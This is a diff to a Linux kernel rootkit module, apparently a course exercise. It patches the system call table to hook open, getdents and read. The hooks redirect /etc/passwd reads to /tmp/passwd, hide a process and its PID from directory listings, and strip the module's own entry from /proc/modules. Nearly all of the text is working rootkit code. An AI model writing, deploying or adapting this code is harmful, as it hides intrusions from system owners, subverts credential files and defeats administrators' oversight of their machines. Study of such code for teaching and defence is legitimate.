@@ -11,6 +11,8 @@
 
 #define BUFFLEN 200
 
+static int openForRead = 0;
+
 static char procName[100];
 static char pid[100];
 module_param_string(str, procName, 100, 0);
@@ -50,26 +52,31 @@ static unsigned long *sys_call_table = (unsigned long*)0xffffffff81a00280;
 //This is used for all system calls.
 asmlinkage int (*original_call)(const char *pathname, int flags);
 asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent * dirp, unsigned int count);
+asmlinkage ssize_t (*original_read)(int fd, void * buf, size_t count);
 
 //Define our new sneaky version of the 'open' syscall
 asmlinkage int sneaky_sys_open(const char *pathname, int flags)
 {
   printk(KERN_INFO "inside sneaky open!\n");
-  if(strcmp(pathname, "/etc/passwd") == 0) {
+  if (strcmp(pathname, "/etc/passwd") == 0) {
     const char * newPath = "/tmp/passwd";
-    copy_to_user(pathname, newPath, strlen(newPath)+1);
+    copy_to_user((void*)pathname, newPath, strlen(newPath) + 1);
     return original_call(pathname, flags);
   }
-  else {
-    return original_call(pathname, flags);
-  } 
+  else if (strcmp(pathname, "/proc/modules") == 0) {
+    openForRead = 1;
+  }
+  return original_call(pathname, flags);
 }
 
 asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent * dirp, unsigned int count) {
-  int nread = original_getdents(fd, dirp, count);
+  int nread;
   struct linux_dirent * d;
-  int res = nread;
+  int res;
   int bpos;
+  printk(KERN_INFO "inside sneaky getdents\n");
+  nread = original_getdents(fd, dirp, count);
+  res = nread;
   for (bpos = 0; bpos < nread;) {
     d = (struct linux_dirent *)((char*)dirp + bpos);
     if (strcmp(d->d_name, "sneaky_process") == 0 || strcmp(d->d_name, pid) == 0) {
@@ -81,8 +88,27 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent * dirp, 
     }
     bpos += d->d_reclen;
   }
-  printk(KERN_INFO "inside sneaky getdents\n");
   return res;
+}
+
+asmlinkage ssize_t sneaky_sys_read(int fd, void * buf, size_t count) {
+  ssize_t numbytes;
+  char * idx;
+  const char * target = "sneaky_mod";
+  numbytes = original_read(fd, buf, count);
+  if (openForRead == 1 && numbytes > 0) {
+    idx = strstr(buf, target);
+    openForRead = 0;      // make sure sneaky_read only enter once when open /proc/modules
+    printk(KERN_INFO "inside sneaky read\n");
+    if (idx != NULL) {
+      char * newLineIdx = strchr(idx, '\n');
+      if (newLineIdx != NULL) {
+        memmove(idx, newLineIdx + 1, (char*)buf + numbytes - 1 - newLineIdx);
+        return numbytes - (newLineIdx - idx + 1);
+      }
+    }
+  }
+  return numbytes;
 }
 
 
@@ -114,6 +140,10 @@ static int initialize_sneaky_module(void)
   original_getdents = (void*) * (sys_call_table + __NR_getdents);
   *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;
 
+  // deal with read
+  original_read = (void*) * (sys_call_table + __NR_read);
+  *(sys_call_table + __NR_read) = (ssize_t)sneaky_sys_read;
+
   //Revert page to read-only
   pages_ro(page_ptr, 1);
   //Turn write protection mode back on
@@ -142,6 +172,7 @@ static void exit_sneaky_module(void)
   //function address. Will look like malicious code was never there!
   *(sys_call_table + __NR_open) = (unsigned long)original_call;
   *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
+  *(sys_call_table + __NR_read) = (unsigned long)original_read;
 
   //Revert page to read-only
   pages_ro(page_ptr, 1);
